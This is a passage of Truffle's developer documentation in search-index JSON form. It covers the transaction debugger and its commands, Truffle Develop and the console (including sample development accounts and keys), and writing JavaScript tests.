tests with the new debug() global! See below . New in Truffle v5.1.29: truffle debug --fetch-external . Debug transactions involving contracts not in your project that are verified on Etherscan ! (And as of v5.1.32, it works with Sourcify too!) See below . New in Truffle v5.4.26: truffle debug --url <provider_url> . Debug transactions without needing a Truffle project or config! See below . Debugging a transaction on the blockchain is different than debugging traditional applications (for instance, applications written in C++ or Javascript). When debugging a transaction on the blockchain, you're not running the code in real-time; instead, you're stepping over the historical execution of that transaction, and mapping that execution onto its associated code. This gives us many liberties in debugging, in that we can debug any transaction, any time, so long as we have the code and artifacts for the contracts the transaction interacted with. Think of these code and artifacts as akin to the debugging symbols needed by traditional debuggers. In order to debug transactions, you'll need the following: Truffle 4.0 or above. The hash of a transaction on your desired blockchain. (If you are using the built-in blockchain and trying to debug a test execution, you may obtain the hash by running truffle develop --log .) The source code and artifacts the transaction encounters. Note that it's okay if your desired transaction resulted in an exception or if it ran out of gas. The transaction still exists on chain, and so you can still debug it! Warning: Debugging a transaction against a contract that was compiled with optimization enabled may not work reliably.", "title": "Overview"}, {"location": "docs/truffle/how-to/debug-test/use-the-truffle-debugger/#in-test-debugging", "text": "Truffle v5.1 and above provides the truffle test --debug flag and associated debug() global function, allowing you to interrupt tests to debug specific operations. Instead of capturing the transaction hash as described below, simply wrap any contract operation with debug() , like so: it ( \"should succeed\" , async function () { // wrap what you want to debug with `debug()`: await debug ( myContract . myFunction ( accounts [ 1 ], { from : accounts [ 0 ] }) ); // ^^^^^^^^^^^^^^^^^^ wrap contract operation ^^^^^^^^^^^^^^ }); Then, run truffle test --debug . Truffle will compile your sources and run your tests as normal until reaching the operation in question. At this point, Truffle will interrupt the normal test flow and start the debugger, allowing you to set breakpoints, inspect Solidity variables, etc. See Writing tests in JavaScript for more information on truffle test , and see Interacting with your contracts to learn about contract operations. Note : This feature currently doesn't work with reverted transactions; until we fix this, you can debug those with direct use of truffle debug .", "title": "In-test debugging"}, {"location": "docs/truffle/how-to/debug-test/use-the-truffle-debugger/#debugging-read-only-calls", "text": "Running the debugger from inside your JS tests allow additional functionality beyond which truffle debug <txHash> can provide. Beyond just debugging transactions, in-test debugging allows you to debug read-only calls as well. it ( \"should get latest result\" , async function () { // wrap what you want to debug with `debug()`: const result = await debug ( myContract . getResult ( \"latest\" ) ); // ^^^^^ read-only function ^^^^^ });", "title": "Debugging read-only calls"}, {"location": "docs/truffle/how-to/debug-test/use-the-truffle-debugger/#command", "text": "To use the debugger, gather the transaction you'd like to debug then run the following: $ truffle debug <transaction hash> Using a transaction starting with 0x8e5dadfb921dd... as an example, the command would look as follows: $ truffle debug 0x8e5dadfb921ddddfa8f53af1f9bd8beeac6838d52d7e0c2fe5085b42a4f3ca76 This will launch the debugging interface described below. If you simply want to open the debugger to get it ready, so that you can debug a transaction later, you can also simply run: $ truffle debug Regardless of how you start the debugger, once it is running you are not limited to debugging only the transaction you launched it with; it is possible to unload the current transaction and load a new one, as described below. You can specify the network you want to debug on with the --network option: $ truffle debug [ <transaction hash> ] --network <network> Also, instead of --network , you can use --url with the URL of a provider; with this option, you can use Truffle Debugger outside of a Truffle project and without a Truffle config. This is primarily useful with the --fetch-external option. $ truffle debug [ <transaction hash> ] --url <provider_url> If you want to debug your Solidity test contracts , you can pass the --compile-tests option: $ truffle debug [ <transaction hash> ] --compile-tests And with the --fetch-external option ( see below ), you can debug contract instances outside your project that have verified source code on Etherscan or Sourcify . When using this option, you must specify a transaction hash to debug, and you will not be able to switch transactions from inside the debugger. $ truffle debug <transaction hash> --fetch-external --network <network> Faster debugger startup: If your project was not compiled all at once (or under certain other conditions), the debugger will have to do its own compile of your project on startup. This can be very slow. If you compile your whole project at once, however, the debugger can likely avoid the initial recompile, speeding up startup greatly.", "title": "Command"}, {"location": "docs/truffle/how-to/debug-test/use-the-truffle-debugger/#debugging-external-contracts-with-verified-source", "text": "If you pass the --fetch-external option, the debugger will attempt to download verified source code off of Etherscan and Sourcify for any addresses involved in the transaction that it cannot find source code for in your project. You can of course debug such transactions without this option, but when stepping through the transaction the external calls to these unrecognized contracts will simply be skipped over. This option can also be abbreviated -x . If you have an Etherscan API key, you can include it in your configuration file and the debugger will use it when downloading source from Etherscan. Including this can speed up downloads. Example: module . exports = { /* ... rest of truffle-config.js ... */ etherscan : { apiKey : \"0123456789abcdef0123456789abcdef\" //replace this with your API key if you have one } }", "title": "Debugging external contracts with verified source"}, {"location": "docs/truffle/how-to/debug-test/use-the-truffle-debugger/#debugging-outside-of-a-truffle-project", "text": "If you are outside of a Truffle project, you can still use truffle debug so long as you pass the --url option, giving the URL of a provider to connect to. This is primarily useful with the --fetch-external option described above .", "title": "Debugging outside of a Truffle project"}, {"location": "docs/truffle/how-to/debug-test/use-the-truffle-debugger/#debugging-interface", "text": "Starting the debugger will open an interface familiar to those that have debugged other types of applications. When it starts, you'll see the following: A list of addresses either transacted against or created during the course of this transaction. A list of available commands for using the debugger. And the initial entry point for the transaction, including contract source file and code preview. The enter key is set to perform the last command entered. When the debugger starts, the enter key is set to step to the next logical source code element encountered during execution (i.e., the next expression or statement evaluated by the Ethereum virtual machine). At this point you can press enter to step through the transaction, or enter one of the available commands to analyze the transaction in more detail. The list of commands is detailed below.", "title": "Debugging interface"}, {"location": "docs/truffle/how-to/debug-test/use-the-truffle-debugger/#o-step-over", "text": "This command steps over the current line, relative to the position of the statement or expression currently being evaluated in the Solidity source file. Use this command if you don't want to step into a function call or contract creation on the current line, or if you'd like to quickly jump to a specific point in the source file.", "title": "(o) step over"}, {"location": "docs/truffle/how-to/debug-test/use-the-truffle-debugger/#i-step-into", "text": "This command steps into the function call or contract creation currently being evaluated. Use this command to jump into the function and quickly start debugging the code that exists there.", "title": "(i) step into"}, {"location": "docs/truffle/how-to/debug-test/use-the-truffle-debugger/#u-step-out", "text": "This command steps out of the currently running function. Use this command to quickly get back to the calling function, or end execution of the transaction if this was the entry point of the transaction.", "title": "(u) step out"}, {"location": "docs/truffle/how-to/debug-test/use-the-truffle-debugger/#n-step-next", "text": "This command steps to the next logical statement or expression in the source code. For example, evaluating sub expressions will need to occur first before the virtual machine can evaluate the full expression. Use this command if you'd like to analyze each logical item the virtual machine evaluates.", "title": "(n) step next"}, {"location": "docs/truffle/how-to/debug-test/use-the-truffle-debugger/#step-instruction", "text": "This command allows you to step through each individual instruction evaluated by the virtual machine. This is useful if you're interested in understanding the low level bytecode created by the Solidity source code. When you use this command, the debugger will also print out the stack data at the time the instruction was evaluated. (If additional data displays have been turned on with the p command, those will be shown too.) You can also use this command with a numerical argument, to step that many times.", "title": "(;) step instruction"}, {"location": "docs/truffle/how-to/debug-test/use-the-truffle-debugger/#p-print-instruction", "text": "This commands prints the current instruction and stack data, but does not step to the next instruction. Use this when you'd like to see the current instruction and stack data after navigating through the transaction with the logical commands described above. This command can also print locations other than the stack, if you want to view memory, storage, or calldata. Simply type p memory to show memory along with the other information, p storage for storage, or p calldata for calldata. Each of these can also be abbreviated, e.g. p mem ; they can also be combined, e.g. p mem sto . You can also add these extra locations to the default display with + ; e.g., p +mem will make it so that memory will always be displayed when you enter p or ; , and p -mem will turn this off. You can even turn off the stack display with p -sta , or force it to display with p sta . All of these options can again be combined. This command also prints a group of instructions surrounding the current instruction. By default, it prints 3 instructions ahead of and 3 instructions behind the current instruction. You can configure the number of instructions to be printed with + and - ; e.g., p +<instructions-ahead> -<instruction-back> will make it print instructions-ahead instructions ahead of and instructions-back instructions behind the current instruction. The configured numbers are saved and used for printout afterward.", "title": "(p) print instruction"}, {"location": "docs/truffle/how-to/debug-test/use-the-truffle-debugger/#l-print-additional-source-context", "text": "This command prints source context surrounding the current source line. By default, it prints 5 lines ahead of and 3 lines behind the current source line. You can configure the number of source lines to be printed with + and - ; e.g., l +<lines-ahead> -<lines-back> will make it print lines-ahead lines ahead of and lines-back lines behind the current line. The configured numbers are saved and used for printout afterward.", "title": "(l) print additional source context"}, {"location": "docs/truffle/how-to/debug-test/use-the-truffle-debugger/#e-print-recent-events", "text": "This command prints events recently emitted by the transaction (as of where you are in it). The event's emitter and decoding will be displayed. If the event has been reverted between where it was emitted and where you are, there will be an indicator printed to show this. By default the command prints the 3 most recent events, but you can use e <number> to print the specified number, or e all to print them all; the number you choose will be remembered and remain as the default until you quit the debugger.", "title": "(e) print recent events"}, {"location": "docs/truffle/how-to/debug-test/use-the-truffle-debugger/#g-turn-on-generated-sources", "text": "When using Solidity 0.7.2 or later, you can use this option to allow the debugger to step into the internal assembly routines that Solidity generates. You can always advance into these with the ; command, but this option allows the other debugger commands ( n , i , o , u ) to step into these routines as well.", "title": "(g) turn on generated sources"}, {"location": "docs/truffle/how-to/debug-test/use-the-truffle-debugger/#g-turn-off-generated-sources", "text": "This command undoes the g command, returning the debugger to its default behavior with regard to generated sources. Note that when generated sources are turned off, you can still advance into them with the ; command; and if a breakpoint is placed in one, continuing with c will still stop on such breakpoints. In addition, once inside such a routine, the other debugger commands ( n , i , o , u ) will advance as normal inside of it; they won't immediately exit it.", "title": "(G) turn off generated sources"}, {"location": "docs/truffle/how-to/debug-test/use-the-truffle-debugger/#h-print-this-help", "text": "Print the list of available commands.", "title": "(h) print this help"}, {"location": "docs/truffle/how-to/debug-test/use-the-truffle-debugger/#q-quit", "text": "Quit the debugger.", "title": "(q) quit"}, {"location": "docs/truffle/how-to/debug-test/use-the-truffle-debugger/#r-reset", "text": "Reset the debugger to the beginning of the transaction.", "title": "(r) reset"}, {"location": "docs/truffle/how-to/debug-test/use-the-truffle-debugger/#b-set-a-breakpoint", "text": "This command allows you to set breakpoints for any line in any of your source files (see examples below). These can be given by line number; by relative line number; by line number in a specified source file; or one may simply add a breakpoint at the current point in the code. You don't need a transaction loaded to set breakpoints, although in that case you will have to specify which source file you mean to set it in.", "title": "(b) set a breakpoint"}, {"location": "docs/truffle/how-to/debug-test/use-the-truffle-debugger/#b-remove-a-breakpoint", "text": "This command allows you to remove any of your existing breakpoints, with the same syntax as for adding them (see example below). Type B all to remove all breakpoints.", "title": "(B) remove a breakpoint"}, {"location": "docs/truffle/how-to/debug-test/use-the-truffle-debugger/#c-continue-until-breakpoint", "text": "This command will cause execution of the code to continue until the next breakpoint is reached or the last line is executed.", "title": "(c) continue until breakpoint"}, {"location": "docs/truffle/how-to/debug-test/use-the-truffle-debugger/#evaluate-and-print-expression", "text": "This command will evaluate and print the given expression, based on the current variables and their values (see also v ).", "title": "(:) evaluate and print expression"}, {"location": "docs/truffle/how-to/debug-test/use-the-truffle-debugger/#add-watch-expression", "text": "This command will add a watch on a provided expression, based on the following syntax: +:<expression> .", "title": "(+) add watch expression"}, {"location": "docs/truffle/how-to/debug-test/use-the-truffle-debugger/#-remove-watch-expression", "text": "This command will remove a watch expression, based on the following syntax: -:<expression> .", "title": "(-) remove watch expression"}, {"location": "docs/truffle/how-to/debug-test/use-the-truffle-debugger/#list-existing-watch-expressions-and-breakpoints", "text": "This command will display a list of all the current watch expressions and breakpoints. It will also report whether generated sources are turned on or off.", "title": "(?) list existing watch expressions and breakpoints"}, {"location": "docs/truffle/how-to/debug-test/use-the-truffle-debugger/#v-display-variables", "text": "This command will display the current variables and their values, but does not step to the next instruction. Use this when you'd like to see the current variables and their values after navigating through the transaction with the logical commands described above. This command can also remove variables and their values from the variables display. If you want to remove solidity builtins variables, global constants, contract variables, or local variables, simply type v -builtins to remove solidity builtins along with the other information from the display, v -global for global constants, v -contract for contract variables, or v -local for local variables. Each of these can also be abbreviated, e.g. v -bui , v -glo , v -con , and v -loc ; they can also be combined, e.g. v -bui -glo . If variables are removed from the variables display, you can still display them without a sign; e.g., v bui will cause solidity builtins variables to be displayed. You can also add these variables back in to the display with + ; e.g., v +bui will make it so that solidity builtins variables will once again always be displayed when you enter v . All of these options can again be combined.", "title": "(v) display variables"}, {"location": "docs/truffle/how-to/debug-test/use-the-truffle-debugger/#t-unload-transaction", "text": "This command unloads the current transaction so you can load a new one. Not usable in --fetch-external mode.", "title": "(T) unload transaction"}, {"location": "docs/truffle/how-to/debug-test/use-the-truffle-debugger/#t-load-transaction", "text": "This command loads a new transaction (given by its transaction hash). Note that if you already have a transaction loaded, you must first explicitly unload it before you can load a new one. Not usable in --fetch-external mode.", "title": "(t) load transaction"}, {"location": "docs/truffle/how-to/debug-test/use-the-truffle-debugger/#y-reset-and-advance-to-final-error", "text": "This command is only usable at the end of a trace. It resets the debugger and then advances it to the location of the final error. If the final error is at the end of the trace, this will have no effect. Note: The use of resetting and advancing, rather than directly jumping to the final error, is something of a stopgap due to the debugger not currently moving backwards; this will be changed in the future to jump directly back to the final error.", "title": "(y) Reset and advance to final error"}, {"location": "docs/truffle/how-to/debug-test/use-the-truffle-debugger/#y-reset-and-advance-to-previous-error", "text": "This command resets the debugger and then advances to the location of the previous error; unlike y , it can be used from anywhere in the trace. Note: The use of resetting and advancing, rather than directly jumping to the final error, is something of a stopgap due to the debugger not currently moving backwards; this will be changed in the future to jump directly back to the final error.", "title": "(Y) Reset and advance to previous error"}, {"location": "docs/truffle/how-to/debug-test/use-the-truffle-debugger/#adding-and-removing-breakpoints", "text": "Below are some examples of adding and removing breakpoints. Note the difference in case between adding (a lowercase 'b') and removing (an uppercase 'B'). If you add a breakpoint at a place where the debugger will skip over, it will be automatically moved down to the next point that the debugger might stop. This does not apply to removing breakpoints. Use the ? command to list current breakpoints. MagicSquare.sol: 11: event Generated(uint n); 12: 13: function generateMagicSquare(uint n) ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^ debug(develop:0x91c817a1...)> b 23 Breakpoint added at line 23. debug(develop:0x91c817a1...)> B 23 Breakpoint removed at line 23. debug(develop:0x91c817a1...)> b SquareLib:5 Breakpoint added at line 5 in SquareLib.sol. debug(develop:0x91c817a1...)> b +10 Breakpoint added at line 23. debug(develop:0x91c817a1...)> b Breakpoint added at this point in line 13. debug(develop:0x91c817a1...)> B all Removed all breakpoints.", "title": "Adding and removing breakpoints"}, {"location": "docs/truffle/how-to/debug-test/use-truffle-develop-and-the-console/", "text": "Use Truffle Develop and the Console \u00b6 Sometimes it's nice to work with your contracts interactively for testing and debugging purposes, or for executing transactions by hand. Truffle provides you two easy ways to do this via an interactive console, with your contracts available and ready to use. Truffle Console : A basic interactive console connecting to any Ethereum client Truffle Develop : An interactive console that also spawns a development blockchain Note : Your contract names get loaded as variables into the console context. For this reason it is recommended to avoid names that might conflict with Node's native objects like Buffer or String. For updates see the related issue on GitHub . Why two different consoles? \u00b6 Having two different consoles allows you to choose the best tool for your needs. Reasons to use Truffle Console : You have a client you're already using, such as Ganache or geth You want to migrate to a testnet (or the main Ethereum network) You want to use a specific mnemonic or account list Reasons to use Truffle Develop : You are testing your project with no intention of immediately deploying You don't need to work with specific accounts (and you're fine with using default development accounts) You don't want to install and manage a separate blockchain client Commands \u00b6 All commands require that you be in your project folder. You do not need to be at the root. Console \u00b6 To launch the console: truffle console This will look for a network definition called development in the configuration, and connect to it, if available. You can override this using the --network <name> option or customize the development network settings. See more details in the Networks section as well as the command reference . When you load the console, you'll immediately see the following prompt: truffle ( development ) > This tells you you're running within a Truffle console using the development network. Truffle Develop \u00b6 To launch Truffle Develop: truffle develop This will spawn a development blockchain locally on port 9545 by default. If you already have a truffle develop session running, it will instead connect to that development blockchain. When you load Truffle Develop, you will see the following: Truffle Develop started at http://localhost:9545/ Accounts: ( 0 ) 0x627306090abab3a6e1400e9345bc60c78a8bef57 ( 1 ) 0xf17f52151ebef6c7334fad080c5704d77216b732 ( 2 ) 0xc5fdf4076b8f3a5357c5e395ab970b5b54098fef ( 3 ) 0x821aea9a577a9b44299b9c15c88cf3087f3b5544 ( 4 ) 0x0d1d4e623d10f9fba5db95830f7d3839406c6af2 ( 5 ) 0x2932b7a2355d6fecc4b5c0b6bd44cc31df247a2e ( 6 ) 0x2191ef87e392377ec08e7c08eb105ef5448eced5 ( 7 ) 0x0f4f2ac550a1b4e2280d04c21cea7ebd822934b5 ( 8 ) 0x6330a553fc93768f612722bb8c2ec78ac90b3bbc ( 9 ) 0x5aeda56215b167893e80b4fe645ba6d5bab767de Private Keys: ( 0 ) c87509a1c067bbde78beb793e6fa76530b6382a4c0241e5e4a9ec0a0f44dc0d3 ( 1 ) ae6ae8e5ccbfb04590405997ee2d52d2b330726137b875053c36d94e974d162f ( 2 ) 0dbbe8e4ae425a6d2687f1a7e3ba17bc98c673636790f1b8ad91193c05875ef1 ( 3 ) c88b703fb08cbea894b6aeff5a544fb92e78a18e19814cd85da83b71f772aa6c ( 4 ) 388c684f0ba1ef5017716adb5d21a053ea8e90277d0868337519f97bede61418 ( 5 ) 659cbb0e2411a44db63778987b1e22153c086a95eb6b18bdf89de078917abc63 ( 6 ) 82d052c865f5763aad42add438569276c00d3d88a2d062d36b2bae914d58b8c8 ( 7 ) aa3680d5d48a8283413f7a108367c7299ca73f553735860a87b08f39395618b7 ( 8 ) 0f62d96d6675f32685bbdb8ac13cda7c23436f63efbb9d07700d8669ff12b7c4 ( 9 ) 8d5366123cb560bb606379f90a0bfd4769eecc0557f1b362dcae9012b548b1e5 Mnemonic: candy maple cake sugar pudding cream honey rich smooth crumble sweet treat This shows you the addresses, private keys, and mnemonic for this particular blockchain. Note : When you run truffle develop for the first time, Truffle will generate a random mnemonic that will persist for you and you alone. If you want to use a different mnemonic or set of addresses, we recommend using Ganache . Warning : Remember to never use any of these addresses or the mnemonic on the mainnet. This is for development only. Log RPC Activity \u00b6 If you wish to see information regarding RPC activity during your Truffle develop session, you can use the --log option. When you run truffle develop --log , Truffle will start up a new develop session and output the addresses and keys as described in the previous section. However, in this terminal window you will not be able to interact with the console like you would in a normal Truffle develop session. Instead it will only output the RPC activity occurring on the network. If you want to interact with the console, you will have to open a new terminal window and connect to the current session by running truffle develop . If you already have a Truffle develop session running and want to log all RPC activity occurring on it, you can run truffle develop --log in a separate terminal window. It will then connect to that session and act the same way as described above. Configuring Truffle Develop \u00b6 You can configure truffle develop to use any of the available ganache-core options and configurable network settings. For example: module . exports = { /* ... rest of config */ networks : { /* ... other networks */ develop : { port : 8545 , network_id : 20 , accounts : 5 , defaultEtherBalance : 500 , blockTime : 3 } } }; Features \u00b6 Both Truffle Develop and the console provide most of the features available in the Truffle command line tool. For instance, you can type migrate --reset within the console, and it will be interpreted the same as if you ran truffle migrate --reset on the command line. Additionally, both Truffle Develop and the console have the following features: All of your compiled contracts are available and ready for use. After each command (such as migrate --reset ) your contracts are reprovisioned so you can start using the newly assigned addresses and binaries immediately. The web3 library is made available and is set to connect to your Ethereum client. Commands available \u00b6 build compile create debug deploy exec help install migrate networks opcode publish run test version If a Truffle command is not available, it is because it is not relevant for an existing project (for example, init ) wouldn't make sense (for example, develop or console ). See full command reference for more information.", "title": "Use Truffle Develop and the Console"}, {"location": "docs/truffle/how-to/debug-test/use-truffle-develop-and-the-console/#use-truffle-develop-and-the-console", "text": "Sometimes it's nice to work with your contracts interactively for testing and debugging purposes, or for executing transactions by hand. Truffle provides you two easy ways to do this via an interactive console, with your contracts available and ready to use. Truffle Console : A basic interactive console connecting to any Ethereum client Truffle Develop : An interactive console that also spawns a development blockchain Note : Your contract names get loaded as variables into the console context. For this reason it is recommended to avoid names that might conflict with Node's native objects like Buffer or String. For updates see the related issue on GitHub .", "title": "Use Truffle Develop and the Console"}, {"location": "docs/truffle/how-to/debug-test/use-truffle-develop-and-the-console/#why-two-different-consoles", "text": "Having two different consoles allows you to choose the best tool for your needs. Reasons to use Truffle Console : You have a client you're already using, such as Ganache or geth You want to migrate to a testnet (or the main Ethereum network) You want to use a specific mnemonic or account list Reasons to use Truffle Develop : You are testing your project with no intention of immediately deploying You don't need to work with specific accounts (and you're fine with using default development accounts) You don't want to install and manage a separate blockchain client", "title": "Why two different consoles?"}, {"location": "docs/truffle/how-to/debug-test/use-truffle-develop-and-the-console/#commands", "text": "All commands require that you be in your project folder. You do not need to be at the root.", "title": "Commands"}, {"location": "docs/truffle/how-to/debug-test/use-truffle-develop-and-the-console/#console", "text": "To launch the console: truffle console This will look for a network definition called development in the configuration, and connect to it, if available. You can override this using the --network <name> option or customize the development network settings. See more details in the Networks section as well as the command reference . When you load the console, you'll immediately see the following prompt: truffle ( development ) > This tells you you're running within a Truffle console using the development network.", "title": "Console"}, {"location": "docs/truffle/how-to/debug-test/use-truffle-develop-and-the-console/#truffle-develop", "text": "To launch Truffle Develop: truffle develop This will spawn a development blockchain locally on port 9545 by default. If you already have a truffle develop session running, it will instead connect to that development blockchain. When you load Truffle Develop, you will see the following: Truffle Develop started at http://localhost:9545/ Accounts: ( 0 ) 0x627306090abab3a6e1400e9345bc60c78a8bef57 ( 1 ) 0xf17f52151ebef6c7334fad080c5704d77216b732 ( 2 ) 0xc5fdf4076b8f3a5357c5e395ab970b5b54098fef ( 3 ) 0x821aea9a577a9b44299b9c15c88cf3087f3b5544 ( 4 ) 0x0d1d4e623d10f9fba5db95830f7d3839406c6af2 ( 5 ) 0x2932b7a2355d6fecc4b5c0b6bd44cc31df247a2e ( 6 ) 0x2191ef87e392377ec08e7c08eb105ef5448eced5 ( 7 ) 0x0f4f2ac550a1b4e2280d04c21cea7ebd822934b5 ( 8 ) 0x6330a553fc93768f612722bb8c2ec78ac90b3bbc ( 9 ) 0x5aeda56215b167893e80b4fe645ba6d5bab767de Private Keys: ( 0 ) c87509a1c067bbde78beb793e6fa76530b6382a4c0241e5e4a9ec0a0f44dc0d3 ( 1 ) ae6ae8e5ccbfb04590405997ee2d52d2b330726137b875053c36d94e974d162f ( 2 ) 0dbbe8e4ae425a6d2687f1a7e3ba17bc98c673636790f1b8ad91193c05875ef1 ( 3 ) c88b703fb08cbea894b6aeff5a544fb92e78a18e19814cd85da83b71f772aa6c ( 4 ) 388c684f0ba1ef5017716adb5d21a053ea8e90277d0868337519f97bede61418 ( 5 ) 659cbb0e2411a44db63778987b1e22153c086a95eb6b18bdf89de078917abc63 ( 6 ) 82d052c865f5763aad42add438569276c00d3d88a2d062d36b2bae914d58b8c8 ( 7 ) aa3680d5d48a8283413f7a108367c7299ca73f553735860a87b08f39395618b7 ( 8 ) 0f62d96d6675f32685bbdb8ac13cda7c23436f63efbb9d07700d8669ff12b7c4 ( 9 ) 8d5366123cb560bb606379f90a0bfd4769eecc0557f1b362dcae9012b548b1e5 Mnemonic: candy maple cake sugar pudding cream honey rich smooth crumble sweet treat This shows you the addresses, private keys, and mnemonic for this particular blockchain. Note : When you run truffle develop for the first time, Truffle will generate a random mnemonic that will persist for you and you alone. If you want to use a different mnemonic or set of addresses, we recommend using Ganache . Warning : Remember to never use any of these addresses or the mnemonic on the mainnet. This is for development only.", "title": "Truffle Develop"}, {"location": "docs/truffle/how-to/debug-test/use-truffle-develop-and-the-console/#log-rpc-activity", "text": "If you wish to see information regarding RPC activity during your Truffle develop session, you can use the --log option. When you run truffle develop --log , Truffle will start up a new develop session and output the addresses and keys as described in the previous section. However, in this terminal window you will not be able to interact with the console like you would in a normal Truffle develop session. Instead it will only output the RPC activity occurring on the network. If you want to interact with the console, you will have to open a new terminal window and connect to the current session by running truffle develop . If you already have a Truffle develop session running and want to log all RPC activity occurring on it, you can run truffle develop --log in a separate terminal window. It will then connect to that session and act the same way as described above.", "title": "Log RPC Activity"}, {"location": "docs/truffle/how-to/debug-test/use-truffle-develop-and-the-console/#configuring-truffle-develop", "text": "You can configure truffle develop to use any of the available ganache-core options and configurable network settings. For example: module . exports = { /* ... rest of config */ networks : { /* ... other networks */ develop : { port : 8545 , network_id : 20 , accounts : 5 , defaultEtherBalance : 500 , blockTime : 3 } } };", "title": "Configuring Truffle Develop"}, {"location": "docs/truffle/how-to/debug-test/use-truffle-develop-and-the-console/#features", "text": "Both Truffle Develop and the console provide most of the features available in the Truffle command line tool. For instance, you can type migrate --reset within the console, and it will be interpreted the same as if you ran truffle migrate --reset on the command line. Additionally, both Truffle Develop and the console have the following features: All of your compiled contracts are available and ready for use. After each command (such as migrate --reset ) your contracts are reprovisioned so you can start using the newly assigned addresses and binaries immediately. The web3 library is made available and is set to connect to your Ethereum client.", "title": "Features"}, {"location": "docs/truffle/how-to/debug-test/use-truffle-develop-and-the-console/#commands-available", "text": "build compile create debug deploy exec help install migrate networks opcode publish run test version If a Truffle command is not available, it is because it is not relevant for an existing project (for example, init ) wouldn't make sense (for example, develop or console ). See full command reference for more information.", "title": "Commands available"}, {"location": "docs/truffle/how-to/debug-test/write-tests-in-javascript/", "text": "Write JavaScript tests \u00b6 Truffle uses the Mocha testing framework and Chai for assertions to provide you with a solid framework from which to write your JavaScript tests. Let's dive in and see how Truffle builds on top of Mocha to make testing your contracts a breeze. Note: If you're unfamiliar with writing unit tests in Mocha, please see Mocha's documentation before continuing. Use contract() instead of describe() \u00b6 Structurally, your tests should remain largely unchanged from that of Mocha: Your tests should exist in the ./test directory, they should end with a .js extension, and they should contain code that Mocha will recognize as an automated test. What makes Truffle tests different from that of Mocha is the contract() function: This function works exactly like describe() except it enables Truffle's clean-room features . It works like this: Before each contract() function is run, your contracts are redeployed to the running Ethereum client so the tests within it run with a clean contract state. The contract() function provides a list of accounts made available by your Ethereum client which you can use to write tests. Since Truffle uses Mocha under the hood, you can still use describe() to run normal Mocha tests whenever Truffle clean-room features are unnecessary. Use contract abstractions within your tests \u00b6 Contract abstractions are the basis for making contract interaction possible from JavaScript (they're basically our flux capacitor ). Because Truffle has no way of detecting which contracts you'll need to interact with within your tests, you'll need to ask for those contracts explicitly. You do this by using the artifacts.require() method, a method provided by Truffle that allows you to request a usable contract abstraction for a specific Solidity contract. As you'll see in the example below, you can then use this abstraction to make sure your contracts are working properly. For more information on using contract abstractions, see the Interacting With Your Contracts section. Using artifacts.require() \u00b6 Using artifacts.require() within your tests works the same way as using it within your migrations; you just need to pass the name of the contract. See the artifacts.require() documentation in the Migrations section for detailed usage. Using web3 \u00b6 A web3 instance is available in each test file, configured to the correct provider. So calling web3.eth.getBalance just works! Examples \u00b6 Here's an example test provided in the MetaCoin Truffle Box using async/await notation. Note the use of the contract() function, the accounts array for specifying available Ethereum accounts, and our use of artifacts.require() for interacting directly with our contracts. File: ./test/metacoin.js const MetaCoin = artifacts . require ( \"MetaCoin\" ); contract ( \"MetaCoin\" , ( accounts ) => { it ( \"should put 10000 MetaCoin in the first account\" , async () => { const metaCoinInstance = await MetaCoin . deployed (); const balance = await metaCoinInstance . getBalance . call ( accounts [ 0 ]); assert . equal ( balance . valueOf (), 10000 , \"10000 wasn't in the first account\" ); }); it ( \"should call a function that depends on a linked library\" , async () => { const metaCoinInstance = await MetaCoin . deployed (); const metaCoinBalance = ( await metaCoinInstance . getBalance . call ( accounts [ 0 ]) ). toNumber (); const metaCoinEthBalance = ( await metaCoinInstance . getBalanceInEth . call ( accounts [ 0 ]) ). toNumber (); assert . equal ( metaCoinEthBalance , 2 * metaCoinBalance , \"Library function returned unexpected function, linkage may be broken\" ); }); it ( \"should send coin correctly\" , async () => { const metaCoinInstance = await MetaCoin . deployed (); // Setup 2 accounts. const accountOne = accounts [ 0 ]; const accountTwo = accounts [ 1 ]; // Get initial balances of first and second account. const accountOneStartingBalance = ( await metaCoinInstance . getBalance . call ( accountOne ) ). toNumber (); const accountTwoStartingBalance = ( await metaCoinInstance . getBalance . call ( accountTwo ) ). toNumber (); // Make transaction from first account to second. const amount = 10 ; await metaCoinInstance . sendCoin ( accountTwo , amount , { from : accountOne }); // Get balances of first and second account after the transactions. const accountOneEndingBalance = ( await metaCoinInstance . getBalance . call ( accountOne ) ). toNumber (); const accountTwoEndingBalance = ( await metaCoinInstance . getBalance . call ( accountTwo ) ). toNumber (); assert . equal ( accountOneEndingBalance , accountOneStartingBalance - amount , \"Amount wasn't correctly taken from the sender\" ); assert . equal ( accountTwoEndingBalance , accountTwoStartingBalance + amount , \"Amount wasn't correctly sent to the receiver\" ); }); }); This test will produce the following output: Contract: MetaCoin \u221a should put 10000 MetaCoin in the first account (83ms) \u221a should call a function that depends on a linked library (43ms) \u221a should send coin correctly (122ms) 3 passing (293ms) Specifying tests \u00b6 You can limit the tests being executed to a specific file as follows: truffle test ./test/metacoin.js See the full command reference for more information. Advanced \u00b6 Truffle gives you access to Mocha's configuration so you can change how Mocha behaves. See the project configuration section for more details. Check out our documentation on interacting with your contracts for more tips, tricks and best practices. TypeScript File Support \u00b6 Truffle supports tests saved as a .ts TypeScript file. Please see the Writing Tests in JavaScript guide for more information.", "title": "Write tests with JavaScript"}, {"location": "docs/truffle/how-to/debug-test/write-tests-in-javascript/#write-javascript-tests", "text": "Truffle uses the Mocha testing framework and Chai for assertions to provide you with a solid framework from which to write your JavaScript tests. Let's dive in and see how Truffle builds on top of Mocha to make testing your contracts a breeze. Note: If you're unfamiliar with writing unit tests in Mocha, please see Mocha's documentation before continuing.", "title": "Write JavaScript tests"}, {"location": "docs/truffle/how-to/debug-test/write-tests-in-javascript/#use-contract-instead-of-describe", "text": "Structurally, your tests should remain largely unchanged from that of Mocha: Your tests should exist in the ./test directory, they should end with a .js extension, and they should contain code that Mocha will recognize as an automated test. What makes Truffle tests different from that of Mocha is the contract() function: This function works exactly like describe() except it enables Truffle's clean-room features . It works like this: Before each contract() function is run, your contracts are redeployed to the running Ethereum client so the tests within it run with a clean contract state. The contract() function provides a list of accounts made available by your Ethereum client which you can use to write tests. Since Truffle uses Mocha under the hood, you can still use describe() to run normal Mocha tests whenever Truffle clean-room features are unnecessary.", "title": "Use contract() instead of describe()"}, {"location": "docs/truffle/how-to/debug-test/write-tests-in-javascript/#use-contract-abstractions-within-your-tests", "text": "Contract abstractions are the basis for making contract interaction possible from JavaScript (they're basically our flux capacitor ). Because Truffle has no way of detecting which contracts you'll need to interact with within your tests, you'll need to ask for those contracts explicitly. You do this by using the artifacts.require() method, a method provided by Truffle that allows you to request a usable contract 